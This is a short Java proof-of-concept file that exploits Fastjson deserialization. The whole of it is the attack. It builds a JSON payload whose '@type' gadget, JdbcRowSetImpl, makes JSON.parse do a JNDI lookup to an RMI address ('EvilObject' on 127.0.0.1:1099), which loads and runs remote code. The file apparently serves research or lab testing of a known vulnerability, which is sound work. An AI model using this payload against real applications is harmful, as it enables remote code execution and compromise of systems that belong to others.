package cc.blbana.JdbcRowSetImpl;
import com.alibaba.fastjson.JSON;
import com.sun.rowset.JdbcRowSetImpl;


import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;

public class Jdbc_Poc {
        public static void main(String[] args) throws Exception {
            String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\", \"autoCommit\":true}";
            JSON.parse(PoC);
        }
    }

